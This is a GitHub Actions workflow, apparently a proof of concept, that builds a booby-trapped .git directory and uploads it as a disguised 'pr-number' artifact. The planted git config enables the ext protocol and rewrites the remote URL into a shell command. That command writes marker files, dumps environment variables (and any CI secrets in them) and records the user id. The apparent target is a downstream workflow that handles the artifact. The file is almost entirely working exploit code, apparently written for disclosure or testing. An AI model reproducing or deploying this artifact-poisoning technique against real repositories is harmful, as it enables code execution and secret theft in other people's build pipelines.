name: poc-artifact-git
on:
  workflow_dispatch:

jobs:
  collect:
    runs-on: ubuntu-latest
    steps:
      - name: Build malicious .git directory (attacker-controlled artifact)
        run: |
          set -eux
          rm -rf evil art
          mkdir evil
          cd evil
          git init -q -b main .
          git config user.email poc@example.com
          git config user.name poc
          echo 'attacker committed content' > README.md
          git add -A
          git commit -qm 'attacker commit'
          printf '%s\n' \
            '[core]' \
            '	repositoryformatversion = 0' \
            '	filemode = true' \
            '	bare = false' \
            '	logallrefupdates = true' \
            '[protocol "ext"]' \
            '	allow = always' \
            '[remote "origin"]' \
            '	url = https://github.com/PDFtoMark/gab-poc-gitartifact' \
            '	fetch = +refs/heads/*:refs/remotes/origin/*' \
            '[url "ext::sh -c touch${IFS}/tmp/PWN_OK&&env>/tmp/PWN_ENV&&id>/tmp/PWN_ID"]' \
            '	insteadOf = https://github.com/PDFtoMark/gab-poc-gitartifact' \
            > .git/config
          cd ..
          mkdir art
          cp -r evil/.git art/.git
          echo 1 > art/pr_number.txt
      - name: Upload artifact named pr-number
        uses: actions/upload-artifact@v7
        with:
          name: pr-number
          path: art
          include-hidden-files: true
